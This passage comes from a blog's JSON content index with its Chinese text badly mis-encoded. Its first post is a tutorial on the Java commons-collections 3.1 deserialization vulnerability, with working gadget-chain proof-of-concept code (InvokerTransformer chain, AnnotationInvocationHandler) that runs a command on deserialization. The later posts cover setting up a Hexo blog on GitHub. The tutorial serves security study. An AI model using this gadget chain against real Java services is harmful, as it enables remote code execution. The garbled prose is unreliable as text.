å¯¹è±¡è®¾å®šçš„å±æ€§å€¼å®Œå…¨ç›¸åŒã€‚åŒæ—¶Javaä¸ºæˆ‘ä»¬æä¾›äº†è‡ªå®šä¹‰writeObject()ã€readObject()æ–¹æ³•çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬åœ¨ç›®æ ‡ç±»ä¸­è‡ªå®šä¹‰writeObject()ã€readObject()æ–¹æ³•ä¹‹åï¼Œå°†ä¼šé¦–å…ˆè°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„æ–¹æ³•ï¼Œç„¶ååœ¨ç»§ç»­æ‰§è¡ŒåŸæœ‰çš„æ–¹æ³•æ­¥éª¤. 1234567891011121314151617181920public class User implements Serializable { public String name; public int age; @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException { Runtime.getRuntime().exec(\"calc\"); }} User ç±»å†™ä¸€ä¸ª readObject æ–¹æ³•ä¸Šå»ï¼Œå½“å¯¹è±¡è¢«ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¯¥æ–¹æ³•å°±ä¼šè¢«è°ƒç”¨ã€‚ åºåˆ—åŒ–æ—¶ä»…èƒ½åºåˆ—åŒ–å¯¹è±¡çš„å±æ€§ï¼Œå¹¶ä¸èƒ½æ§åˆ¶æ–¹æ³•ä¸­çš„reObjectçš„ä»£ç ï¼Œæ‰€æœ‰æ¼æ´çš„æ„é€ éœ€è¦å¼•å…¥æ–°çš„jaråŒ… commons-collections-3.1ååºåˆ—åŒ–æ¼æ´ æ¼æ´åˆ©ç”¨ åˆ©ç”¨maven å®‰è£…ä¾èµ– 12345678&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Pocexec { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //è§¦å‘æ¼æ´ Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\"); }} æ¼æ´åˆ†æ java.lang.Runtime#exec(java.lang.String)åœ¨execå¤„æ·»åŠ æ–­ç‚¹ æŸ¥çœ‹è°ƒç”¨é“¾ æœ€ç»ˆéå†äº†â€outerMapâ€è¿™ä¸ªMapå¯¹è±¡çš„ Entry é›†åˆï¼Œç„¶åæ‰§è¡Œäº† Entry å¯¹è±¡çš„çš„ setValue æ–¹æ³•å¯¼è‡´æ‰§è¡Œäº†åå°„é“¾ã€‚æ‰€ä»¥å…ˆæŸ¥çœ‹ outerMap çš„å®ç°ç±» Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); è°ƒç”¨äº†æ–¹æ³•org.apache.commons.collections.map.TransformedMap#decorateè¿™ä¸ªé™æ€æ–¹æ³•åˆå»newäº†ä¸€ä¸ªTransformedMapå¯¹è±¡ã€‚mapä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ™®é€šçš„æ•°æ®ï¼ŒvalueTransformeråˆ™æ˜¯æ„é€ çš„è°ƒç”¨é“¾ã€‚org.apache.commons.collections.map.TransformedMap#TransformedMapå®ä¾‹åŒ–å¯¹è±¡æˆåŠŸåä¾æ¬¡è°ƒç”¨äº†å››ä¸ªæ–¹æ³• entrySet() iterator() next() setValue() åœ¨ç±» TransformedMapä¸­æœªæ‰¾åˆ°å®šä¹‰çš„ entrySet()æ–¹æ³•ï¼Œåœ¨ä»–çš„çˆ¶ç±»AbstractInputCheckedMapDecorator ä¸­æ‰¾org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#entrySetnew äº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetEntrySetç±»ä¸­çš„iteratoræ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iteratoråˆnewäº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIteratorEntrySetIteratorç±»ä¸­çš„nextæ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#nextåˆnewäº†ä¸€ä¸ªå†…éƒ¨ç±»org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntryMapEntryç±»ä¸­çš„setValueæ–¹æ³•org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValueç¬¬ä¸€è¡Œè°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œæ­¤å¤„çš„parentæ¥è‡ªæ‰€ä»¥å®é™…ä¸Šè°ƒç”¨ä¸º org.apache.commons.collections.map.TransformedMap#checkSetValueè°ƒç”¨äº†valueTransformer çš„transformæ–¹æ³•æ‰€ä»¥é¦–å…ˆè°ƒç”¨äº†org.apache.commons.collections.functors.ChainedTransformer#transformå¾ªç¯è°ƒç”¨æ•°ç»„æ¯ä¸€ä¸ªå¯¹è±¡çš„transformæ–¹æ³•ï¼Œå¹¶ä¼ å…¥objectå¯¹è±¡ï¼Œå†å°†æ‰§è¡Œç»“æœèµ‹å€¼ç»™objectå¯¹è±¡[0]æ˜¯ConstantTransformerå¯¹è±¡ï¼Œå®ƒä¼šè¿”å›newæ—¶å€™çš„å‚æ•°ä¸­çš„Objectå¯¹è±¡ï¼Œè¿™é‡Œä¹Ÿæ˜¯å°±æ˜¯â€java.Runtimeâ€[1]-[3]æ˜¯InvokerTransformerå¯¹è±¡ï¼Œè°ƒç”¨çš„æ˜¯åå°„çš„ä»£ç  iTransformersçš„å€¼æ˜¯åœ¨åˆå§‹åŒ–æ„å»ºChainedTransformeræ—¶ç”Ÿæˆorg.apache.commons.collections.functors.ChainedTransformer#ChainedTransformerConstantTransformerç±»ä¸­å®ç°transformæ–¹æ³•org.apache.commons.collections.functors.ConstantTransformer#transformInvokerTransformerç±»ä¸­å®ç°äº†transformæ–¹æ³•org.apache.commons.collections.functors.InvokerTransformer#transform 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } (â€œgetMethodâ€, new Class[] {String.class, Class[].class }, new Object[] {â€œgetRuntimeâ€, new Class[0] })iMethodName = â€œgetMethodâ€;iParamTypes = new Class[] {String.class, Class[].class } ;iArgs = new Object[] {â€œgetRuntimeâ€, new Class[0] } 123456789101112public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); } ......} ç¬¬ä¸€ä¸ªå‚æ•°â€getMethodâ€æ˜¯è¿™ä¸ªå‡½æ•°çš„åå­— ç¬¬äºŒä¸ªå‚æ•°new Class[]{String.class, Class[].class}æ˜¯getMethodçš„2ä¸ªå‚æ•°å‚æ•°ç±»å‹ï¼Œä¸€ä¸ªæ˜¯Stringï¼Œä¸€ä¸ªæ˜¯class[] ç¬¬ä¸‰ä¸ªå‚æ•°new Object[]{â€œgetRuntimeâ€, new Class[0]}æ˜¯getMethodçš„2ä¸ªå‚æ•°å€¼ï¼Œä¸€ä¸ªæ˜¯getRuntimeï¼Œä¸€ä¸ªæ˜¯ç©ºï¼Œå› ä¸ºæ˜¯æ•°ç»„å½¢å¼æ‰€ä»¥è¦è¿™ä¹ˆå†™ getMethod(&lt;String&gt; â€œgetRuntimeâ€, &lt;Class[]&gt; null)invoke(&lt;Object&gt;null, &lt;Object[]&gt;null)exec(&lt;String&gt;â€œâ€calc.exeâ€â€) å°±æ˜¯é€šè¿‡åå°„å»è°ƒç”¨Runtime.getRuntime().exec(â€œcalc.exeâ€) Javaåå°„æœºåˆ¶ javaä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime.getRuntime().exec(\"calc\"); }} æ­£å¸¸çš„æ‰§è¡Œæ­¥éª¤ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Runtime runtime = Runtime.getRuntime(); runtime.exec(\"calc\"); } } ç›¸å¯¹åº”çš„åå°„ä»£ç ä¸º 123456public class Exec { public static void main(String[] args)throws Exception{ Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\"); }} Method Class.getMethod(String name, Class&lt;?&gt;â€¦ parameterTypes)çš„ä½œç”¨æ˜¯è·å¾—å¯¹è±¡æ‰€å£°æ˜çš„å…¬å¼€æ–¹æ³•ã€‚è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°nameæ˜¯è¦è·å¾—æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°parameterTypesæ˜¯æŒ‰å£°æ˜é¡ºåºæ ‡è¯†è¯¥æ–¹æ³•å½¢å‚ç±»å‹ã€‚ getMethod(æ–¹æ³•å, æ–¹æ³•ç±»å‹)Object runtime = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\", new Class[]{}).invoke(null);ç­‰ä»·äºObject runtime = java.lang.Runtime.getRuntime() person.getClass().getMethod(â€œSpeakâ€, null);è·å¾—personå¯¹è±¡çš„Speakæ–¹æ³•ï¼Œå› ä¸ºSpeakæ–¹æ³•æ²¡æœ‰å½¢å‚ï¼Œæ‰€ä»¥parameterTypesä¸ºnull person.getClass().getMethod(â€œrunâ€, String.class);è·å¾—personå¯¹è±¡çš„runæ–¹æ³•ï¼Œå› ä¸ºrunæ–¹æ³•çš„å½¢å‚æ˜¯Stringç±»å‹çš„ï¼Œæ‰€ä»¥parameterTypesä¸ºString.class Method Class.invoke(Object obj, Objectâ€¦ args)invoke(æŸä¸ªå¯¹è±¡å®ä¾‹ï¼Œ ä¼ å…¥å‚æ•°) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\");ç­‰ä»·äº runtime.exec(\"calc\");è°ƒç”¨ç”Ÿæˆçš„runtimeå®ä¾‹çš„execæ–¹æ³•ï¼Œå¹¶å°†â€clacâ€å‚æ•°ä¼ å…¥exec()æ–¹æ³• å®é™…åˆ©ç”¨ å¯¹è±¡æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œä½†å¹¶ä¸åœ¨ååºåˆ—åŒ–æ—¶è§¦å‘è°ƒç”¨é“¾ï¼Œè€Œæ˜¯è¦ç»è¿‡è¿­ä»£å™¨è¿­ä»£å¹¶ä¸”ä½¿ç”¨ setValue() æ–¹æ³•æ‰è¡Œï¼Œæ­£å¸¸æƒ…å†µä¸‹åŸºæœ¬ä¸ä¼šæœ‰è¿™ç§åœºæ™¯ã€‚ sun.reflect.annotation.AnnotationInvocationHandlerè¯¥ç±»ä¸­é‡å†™äº†readObjectæ–¹æ³•,åœ¨è¢«è°ƒç”¨æ—¶ä¼šæ‰§è¡ŒsetValueæ“ä½œ, å¦‚æœèƒ½æŠŠTransformedMapè£…å…¥è¿™ä¸ªAnnotationInvocationHandlerç±»å°±å¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œ åˆ©ç”¨ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class AExec implements Serializable { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"value\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(java.lang.annotation.Target.class, transformedMap); //Object instance = ctor.newInstance(java.lang.annotation.Retention.class, transformedMap); //åºåˆ—åŒ– FileOutputStream fileOutputStream = new FileOutputStream(\"serialize3.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(instance); objectOutputStream.close(); //ååºåˆ—åŒ– FileInputStream fileInputStream = new FileInputStream(\"serialize3.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); }} java.lang.Runtime#exec(java.lang.String)åœ¨execå¤„æ·»åŠ æ–­ç‚¹ æŸ¥çœ‹è°ƒç”¨é“¾ sun.reflect.annotation.AnnotationInvocationHandler#readObject ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° var1 å¿…é¡»ä¸ºç»§æ‰¿Annotationçš„å­ç±»ï¼ŒAnnotationè¿™ä¸ªæ¥å£æ˜¯æ‰€æœ‰æ³¨è§£ç±»å‹çš„å…¬ç”¨æ¥å£ï¼Œæ‰€æœ‰æ³¨è§£ç±»å‹éƒ½å®ç°äº†è¿™ä¸ªæ¥å£ã€‚ java.lang.annotation.Retention.class java.lang.annotation.Target.class å¦åˆ™åœ¨è¿™ä¸ªåœ°æ–¹å°±returnï¼Œä¸ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œäº† ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•° var2 åˆ™æ˜¯æ„é€ çš„è°ƒç”¨é“¾åŒæ—¶mapçš„é”®å€¼å¿…é¡»ä¸º\"value\"ï¼Œå¦åˆ™åˆ©ç”¨ä¸æˆåŠŸï¼Œè¿™æ˜¯ä¸€å¤„å°ç»†èŠ‚~ Java ååºåˆ—åŒ–æ¼æ´å§‹æœ«ï¼ˆ1ï¼‰â€” Apache Commonsæµ…æ˜¾æ˜“æ‡‚çš„JAVAååºåˆ—åŒ–å…¥é—¨æ‰‹æŠŠæ‰‹æ•™ä½ å†™JAVAååºåˆ—åŒ–çš„POC document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hexoæ­å»ºä¸ªäººåšå®¢","slug":"Hexoæ­å»ºä¸ªäººåšå®¢","date":"2020-08-15T15:54:00.000Z","updated":"2020-10-12T06:10:55.189Z","comments":true,"path":"2020/08/15/Hexoæ­å»ºä¸ªäººåšå®¢/","link":"","permalink":"http://yoursite.com/2020/08/15/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"æ­å»ºåšå®¢ ç¯å¢ƒæ­å»º å®‰è£… Git &amp;&amp; Node.js GitNode.js","text":"æ­å»ºåšå®¢ ç¯å¢ƒæ­å»º å®‰è£… Git &amp;&amp; Node.js GitNode.js å®‰è£… Hexo Git å’Œ Node.js å®‰è£…å¥½ä¹‹åï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªç”¨äºå­˜æ”¾åšå®¢æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼Œè¿›å…¥æ–‡ä»¶å¤¹åï¼Œå®‰è£…å¹¶ä½¿ç”¨ Hexo ã€‚ 12$ npm install -g hexo-cli$ hexo init å®‰è£…å®Œæˆä¹‹åï¼Œæ–‡ä»¶å¤¹çš„ç›®å½•å¦‚ä¸‹ï¼š |â€”â€”node_modules|â€”â€”public|â€”â€”scaffolds|â€”â€”source|â€”â€”themes|â€”â€”_config.yml|â€”â€”.gitignore|â€”â€”db.json|â€”â€”package.json|â€”â€”package-lock.json ç”Ÿæˆé™æ€åšå®¢æ–‡ä»¶ åœ¨ Git Bash ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š 12$ hexo g # ç”Ÿæˆ$ hexo s # å¯åŠ¨æœåŠ¡ åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://localhost:4000/ å°†åšå®¢éƒ¨ç½²åˆ° Github ä¸Š åˆ›å»ºä»“åº“ åˆ›å»ºä¸€ä¸ªåä¸ºä½ ç”¨æˆ·å.github.ioçš„ä»“åº“ï¼Œ(å¿…é¡»æ˜¯ç”¨æˆ·åï¼Œå…¶ä»–åç§°æ— æ•ˆ),ä»¥åçš„è®¿é—®åœ°å€å°±æ˜¯ http://ç”¨æˆ·å.github.io é…ç½® SSH å¯†é’¥ æŸ¥çœ‹æœ¬æœºæ˜¯å¦å­˜åœ¨ .ssh ç›®å½• 1$ cd ~/.ssh å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€å¯¹æ–°çš„ SSH å¯†é’¥ 123$ssh-keygen -t rsa -C \"your_email@example.com\" # è¿™å°†æŒ‰ç…§ä½ æä¾›çš„é‚®ç®±åœ°å€ï¼Œåˆ›å»ºä¸€å¯¹å¯†é’¥Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter] æ ¹æ®æç¤ºåˆ°è¾“å…¥å¯†ç å’Œç¡®è®¤å¯†ç  12Enter passphrase (empty for no passphrase): [Type a passphrase]Enter same passphrase again: [Type passphrase again] ç”Ÿæˆ SSH ä¹‹å è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†å…¬é’¥çš„å†…å®¹å¤åˆ¶åˆ°ç³»ç»Ÿç²˜è´´æ¿(clipboard)ä¸­ï¼š 1clip &lt; ~/.ssh/id_rsa.pub ç²˜è´´å…¬é’¥åˆ° github â€“&gt; Settings â€“&gt; SSH keys è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è®¾ç½®æˆåŠŸ 1$ ssh -T git@github.com è®¾ç½®ç”¨æˆ·ä¿¡æ¯ Git ä¼šæ ¹æ®ç”¨æˆ·çš„åå­—å’Œé‚®ç®±æ¥è®°å½•æäº¤ï¼ŒGitHubä¹Ÿæ˜¯ç”¨è¿™äº›ä¿¡æ¯æ¥åšæƒé™çš„å¤„ç†ï¼Œè¾“å…¥ä¸‹é¢çš„ä»£ç è¿›è¡Œä¸ªäººä¿¡æ¯çš„è®¾ç½®ï¼ŒæŠŠåç§°å’Œé‚®ç®±æ›¿ã€‚ 123$ git config --global user.name \"Whippet\" #ç”¨æˆ·å$ git config --global user.email \"Whippet0@qq.com\" #é‚®ç®±$ git config --list #æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ æœ¬åœ°çš„ Hexo æ–‡ä»¶ æ›´æ–°åˆ° Github ç™»é™† Github æ‰¾åˆ°åœ°å€https://github.com/Whippet0/Whippet0.github.io.git å¤åˆ¶è‡³ hexo å®‰è£…ç›®å½•ä¸‹çš„ _config.yml æ–‡ä»¶ä¸­ 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/Whippet0/Whippet0.github.io.git branch: master åœ¨ hexo æ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œ 1234$ hexo g$ hexo dæˆ–è€…$ hexo g -d å¦‚æœ hexo d çš„æ—¶å€™æŠ¥é”™ ERROR Deployer not found: gitæ‰§è¡Œ npm install hexo-deployer-git --save ç„¶åéœ€è¦è¾“å…¥ github çš„è´¦å·å’Œå¯†ç  æˆåŠŸä¹‹åè®¿é—® https://whippet0.github.io/ ç¾åŒ–åšå®¢ è¿›å…¥ hexo ä¸»é¢˜å®˜ç½‘æŒ‘é€‰æˆ‘ä»¬å–œæ¬¢çš„ä¸»é¢˜ï¼Œå¤åˆ¶ä¸»é¢˜çš„åœ°å€https://github.com/Molunerfinn/hexo-theme-melodyæ‰“å¼€Hexoæ–‡ä»¶å¤¹ æŒ‰ç…§ github ä¸Šçš„æç¤ºè¿›è¡Œæ“ä½œ è‹¥æ²¡æœ‰æç¤ºåˆ™ç›´æ¥ git clone è¯¥æ–‡ä»¶å¤¹ã€‚ä¸‹è½½å®Œæˆåï¼Œæ‰“å¼€Hexoæ–‡ä»¶å¤¹ä¸‹çš„é…ç½®æ–‡ä»¶_config.yml ä¿®æ”¹å‚æ•°ä¸ºï¼štheme: melody åœ¨ Git Bash ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š 12$ hexo g # ç”Ÿæˆ$ hexo s # å¯åŠ¨æœåŠ¡ åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://localhost:4000/åœ¨æœ¬åœ°è¿›è¡ŒæŸ¥çœ‹ éƒ¨ç½²ä¸»é¢˜åˆ°github ä¸Š 12hexo clean (å¿…é¡»è¦ï¼Œä¸ç„¶æœ‰æ—¶å› ä¸ºç¼“å­˜é—®é¢˜ï¼ŒæœåŠ¡å™¨æ›´æ–°ä¸äº†ä¸»é¢˜)hexo g -d æœ€åæˆ‘é€‰æ‹©äº†è¿™ä¸ªä¸»é¢˜ stun å› ä¸ºæœ‰é…å¥—çš„ä¸­æ–‡è¯´æ˜ï¼Œæ‰€ä»¥é…ç½®èµ·æ¥å¾ˆæ–¹ä¾¿ã€‚ åŒæ—¶ä¹Ÿå¯ä»¥è®©åšå®¢ä¸Šæ·»åŠ ä¸€äº› Emoji ğŸ‘´ å‘å¸ƒæ–‡ç«  å›¾ç‰‡é…ç½® åœ¨æ ¹ç›®å½•ä¸‹é…ç½®æ–‡ä»¶_config.yml ä¸­ post_asset_folder: trueå®‰è£…æ’ä»¶ 1$ npm install https://github.com/CodeFalling/hexo-asset-image -- save åˆ©ç”¨ hexo n \"æ–‡ç« åç§°\" åœ¨ source\\_postsä¸‹ç”Ÿæˆä¸€ä¸ªæ–°çš„æ–‡ç« æ—¶ï¼ŒåŒæ—¶ä¹Ÿä¼šç”Ÿæˆä¸€ä¸ªæ–‡ç« åç§°çš„æ–‡ä»¶å¤¹ï¼ŒæŠŠå›¾ç‰‡æ”¾åœ¨æ–‡ç« åç§°æ–‡ä»¶å¤¹ä¸‹ï¼Œåœ¨ markdown ä¸­åˆ©ç”¨å›¾ç‰‡æ—¶æ˜¯éœ€è¦åŠ ä¸Šæ–‡ä»¶å¤¹çš„ç›®å½•ï¼Œä½†æ˜¯ä¸Šä¼ è‡³ github æ—¶ å¹¶ä¸éœ€è¦æ–‡ä»¶å¤¹çš„ç›®å½•ã€‚ç„¶åå°±åˆ©ç”¨ Oah çš„è„šæœ¬ï¼Œè½»æ¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-08-15T13:31:50.000Z","updated":"2020-10-12T06:10:55.188Z","comments":true,"path":"2020/08/15/hello-world/","link":"","permalink":"http://yoursite.com/2020/08/15/hello-world/","excerpt":"","text":"Hello word ğŸ˜„ ğŸ˜„ ğŸ˜„ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[],"tags":[]}